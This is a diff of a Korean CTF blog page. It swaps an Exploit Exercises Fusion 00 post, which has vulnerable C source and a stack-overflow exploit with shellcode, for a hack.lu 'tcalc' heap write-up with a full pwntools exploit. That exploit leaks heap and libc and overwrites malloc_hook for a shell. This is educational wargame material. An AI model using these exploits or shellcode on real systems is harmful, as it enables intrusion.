@@ -7,20 +7,20 @@
   
   
   
-  <title>exploit_exercise_fusion_00 | 귀찮다</title>
+  <title>hack.lu - tcalc | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="문제 소스코드">
-<meta name="keywords" content="pwnable">
+  <meta name="description" content="hack.lu - tcalc">
+<meta name="keywords" content="pwnable, ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="exploit_exercise_fusion_00">
-<meta property="og:url" content="https://blog.haklog.xyz/2018/09/23/exploit-exercise-fusion-00/index.html">
+<meta property="og:title" content="hack.lu - tcalc">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/12/01/tcalc/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="문제 소스코드">
+<meta property="og:description" content="hack.lu - tcalc">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-25T10:20:02.000Z">
+<meta property="og:updated_time" content="2020-01-06T02:17:44.849Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="exploit_exercise_fusion_00">
-<meta name="twitter:description" content="문제 소스코드">
+<meta name="twitter:title" content="hack.lu - tcalc">
+<meta name="twitter:description" content="hack.lu - tcalc">
   
   
     <link rel="icon" href="/img/one.png">
@@ -244,11 +244,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-exploit-exercise-fusion-00" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-tcalc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/09/23/exploit-exercise-fusion-00/" class="article-date">
-      <time datetime="2018-09-23T14:57:28.000Z" itemprop="datePublished">2018-09-23</time>
+      <a  href="/2019/12/01/tcalc/" class="article-date">
+      <time datetime="2019-12-01T02:16:26.000Z" itemprop="datePublished">2019-12-01</time>
 </a>
 
     </div>
@@ -262,7 +262,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      exploit_exercise_fusion_00
+      hack.lu - tcalc
     </h1>
   
 
@@ -271,14 +271,10 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/wargame/">wargame</a>
-    </div>
-
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-ctf/">pwnable, ctf</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -288,13 +284,30 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>문제 소스코드</p>
+        <p>hack.lu - tcalc</p>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;../common/common.c&quot;    </span><br><span class="line"> </span><br><span class="line">int fix_path(char *path)</span><br><span class="line">&#123;</span><br><span class="line">  char resolved[128];</span><br><span class="line">  </span><br><span class="line">  if(realpath(path, resolved) == NULL) return 1; // can&apos;t access path. will error trying to open</span><br><span class="line">  strcpy(path, resolved);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *parse_http_request()</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[1024];</span><br><span class="line">  char *path;</span><br><span class="line">  char *q;</span><br><span class="line"> </span><br><span class="line">  printf(&quot;[debug] buffer is at 0x%08x :-)\n&quot;, buffer);</span><br><span class="line"> </span><br><span class="line">  if(read(0, buffer, sizeof(buffer)) &lt;= 0) errx(0, &quot;Failed to read from remote host&quot;);</span><br><span class="line">  if(memcmp(buffer, &quot;GET &quot;, 4) != 0) errx(0, &quot;Not a GET request&quot;);</span><br><span class="line"> </span><br><span class="line">  path = &amp;buffer[4];</span><br><span class="line">  q = strchr(path, &apos; &apos;);</span><br><span class="line">  if(! q) errx(0, &quot;No protocol version specified&quot;);</span><br><span class="line">  *q++ = 0;</span><br><span class="line">  if(strncmp(q, &quot;HTTP/1.1&quot;, 8) != 0) errx(0, &quot;Invalid protocol&quot;);</span><br><span class="line"> </span><br><span class="line">  fix_path(path);</span><br><span class="line"> </span><br><span class="line">  printf(&quot;trying to access %s\n&quot;, path);</span><br><span class="line"> </span><br><span class="line">  return path;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int fd;</span><br><span class="line">  char *p;</span><br><span class="line"> </span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line">  set_io(fd);</span><br><span class="line"> </span><br><span class="line">  parse_http_request(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from socket import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">p = lambda x : struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HOST = &quot;192.168.111.129&quot;</span><br><span class="line">PORT = 20000</span><br><span class="line"> </span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST,PORT))</span><br><span class="line"> </span><br><span class="line">#a = s.recv(1024)</span><br><span class="line"> </span><br><span class="line">#addr = a[21:31]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;GET &quot;</span><br><span class="line">payload += &quot;\x90&quot;*(139-len(addr+shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">payload += p(0xbf8c55e8+20)</span><br><span class="line">payload += &quot; HTTP/1.1&quot;</span><br><span class="line"> </span><br><span class="line">s.send(payload)</span><br><span class="line">s.send(&quot;id&quot;)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## TCALC</span><br><span class="line"></span><br><span class="line">c 파일과 바이너리, 립씨가 주어진다.</span><br><span class="line"></span><br><span class="line">주의해서 봐야 할 부분은 이 부분이다.</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">/* security */</span><br><span class="line">	if(!(0 &lt;= idx &lt; ARR_LEN) || data[idx] == NULL)&#123;exit(0);&#125;</span><br><span class="line"></span><br><span class="line">	/* Sum up all values and divide them by the number of values */</span><br><span class="line">	for(int i = 1; i &lt; (data[idx][0] + 1); i++)&#123;</span><br><span class="line">		sum += data[idx][i];	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-
+<p>ida로 까보거나 어셈으로 보면 </p>
+<p>!(0 &lt;= idx &lt; ARR_LEN) 부분이 삭제되어 있는 것을 발견할 수 있다. 이건 매우 기초적인 c언어 문법 실수인데, 간혹 헷갈릴 수 있다.</p>
+<p>0 &lt;= idx 가 거짓이든 참이든 각각 0과 1를 리턴할 것이고, 이는 무조건 arr_len 보다 작은 값이기에 컴파일러가 최적화하면서 제거한 것이다.</p>
+<p>고로 print_average 함수와 delete에서 oob가 일어나게된다.</p>
+<h3 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h3><ul>
+<li>HEAP LEAK<ul>
+<li>FREE된 청크의 FD를 이용해야하는데, TCACHE의 FD는 사용자 공간 부분부터 가리키기 때문에 tcache로는 어렵다. 헤더부분을 가리키는 fastdin의 fd를 사용하면 된다.</li>
+</ul>
+</li>
+<li>LIBC LEAK<ul>
+<li>tcache 이상의 chunk를 free 시키고 oob free로 leak된 heap주소를 이용하여 읽어오면 된다.</li>
+</ul>
+</li>
+<li>OVERWRITE malloc_hook<ul>
+<li>나머지는 그냥 fastbin corruption으로 해결하면 되는데, malloc_hook을 덮는 과정에서 malloc_hook-0x23에 할당하기 때문에 정렬되어있지 않다는 문제가 있다. 고로 간단한 비트연산으로 해결하면 된다.</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./chall"</span>)</span><br><span class="line">e = ELF(<span class="string">"./chall"</span>)</span><br><span class="line">l = e.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_numbers</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        r.sendline(str(i))</span><br><span class="line">    <span class="comment">#count += 1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printa</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, str(idx))</span><br><span class="line">    <span class="comment">#count += 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, str(idx))</span><br><span class="line">    <span class="comment">#count +=1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    get_numbers(<span class="number">2</span>, [<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printa(<span class="number">0x1190</span>/<span class="number">8</span>)</span><br><span class="line">r.recvuntil(<span class="string">"is:"</span>)</span><br><span class="line">data = r.recv(<span class="number">15</span>)</span><br><span class="line">heap = (int(data)*<span class="number">2</span>+<span class="number">1</span>) - <span class="number">0x13c2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"HEAP BASE : "</span> + hex(heap))</span><br><span class="line">get_numbers(<span class="number">160</span>, [<span class="number">1</span>]*<span class="number">160</span>)</span><br><span class="line">get_numbers(<span class="number">2</span>, [<span class="number">1</span>,heap+<span class="number">0x13a0</span>])</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">printa(<span class="number">0x1670</span>/<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"is:"</span>)</span><br><span class="line">data = r.recv(<span class="number">15</span>)</span><br><span class="line">libc = (int(data)*<span class="number">2</span>+<span class="number">1</span> - <span class="number">0x511</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">"LIBC BASE : "</span> + hex(libc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################### EXPLOIT FASTBIN ########################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_numbers(<span class="number">2</span>, [<span class="number">2</span>, heap+<span class="number">0x13f0</span>])</span><br><span class="line">get_numbers(<span class="number">5</span>, [<span class="number">0</span>, <span class="number">0</span> , <span class="number">0x71</span>, <span class="number">0</span> , <span class="number">0</span>])</span><br><span class="line">get_numbers(<span class="number">0x60</span>/<span class="number">8</span>, [<span class="number">0x21</span>]*<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        get_numbers(<span class="number">12</span>, [<span class="number">1</span>]*<span class="number">12</span>)</span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0x1160</span>/<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">system = libc + l.sym[<span class="string">'system'</span>]</span><br><span class="line">get_numbers(<span class="number">12</span>, [<span class="number">0</span>] *<span class="number">2</span> + [<span class="number">0x71</span>,libc +l.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>] +[<span class="number">0x90</span>]*<span class="number">8</span>)</span><br><span class="line">get_numbers(<span class="number">12</span>, [<span class="number">0xda</span>]*<span class="number">12</span>)</span><br><span class="line">get_numbers(<span class="number">12</span>, [<span class="number">0</span>, (system &amp; <span class="number">0x000000FFFFFFFFFF</span>) &lt;&lt; <span class="number">24</span>, (system&amp;<span class="number">0xFFFFFF0000000000</span>) &gt;&gt; <span class="number">40</span>] + [<span class="number">0</span>] * <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> list(l.search(<span class="string">"sh\x00"</span>)):</span><br><span class="line">            <span class="keyword">if</span> addr % <span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">                sh = libc + addr</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">sh = sh/<span class="number">8</span><span class="number">-1</span></span><br><span class="line"></span><br><span class="line">log.info(sh)</span><br><span class="line">get_numbers(sh, [])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -302,28 +315,28 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></p>
+        <p><span>제목:</span><a  href="/2019/12/01/tcalc/">hack.lu - tcalc</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2018년09월23일 - 23시57분</p>
-        <p><span>마지막 업데이트:</span>2018년09월25일 - 19시20분</p>
+        <p><span>발행 시간:</span>2019년12월01일 - 11시16분</p>
+        <p><span>마지막 업데이트:</span>2020년01월06일 - 11시17분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2018/09/24/exploit-exercise-fusion-01/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2019/12/26/post/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          exploit-exercise-fusion-01
+          Chrismas CTF 2019 baby seccomp
         
       </div>
     </a>
   
   
-    <a  href="/2018/09/23/gadget-searcher/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">gadget_searcher</div>
+    <a  href="/2019/11/02/codegate 2017 quals - jsworld/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Codegate 2017 quals - JS WORLD</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -335,7 +348,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXPLOIT"><span class="toc-number">1.</span> <span class="toc-text">EXPLOIT</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -431,13 +444,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/24/exploit-exercise-fusion-01/" title="上一篇: exploit-exercise-fusion-01">
+            <a  href="/2019/12/26/post/" title="上一篇: Chrismas CTF 2019 baby seccomp">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2018/09/23/gadget-searcher/" title="下一篇: gadget_searcher">
+            <a  href="/2019/11/02/codegate 2017 quals - jsworld/" title="下一篇: Codegate 2017 quals - JS WORLD">
                 <i class="fa fa-angle-right"></i>
             </a>
         
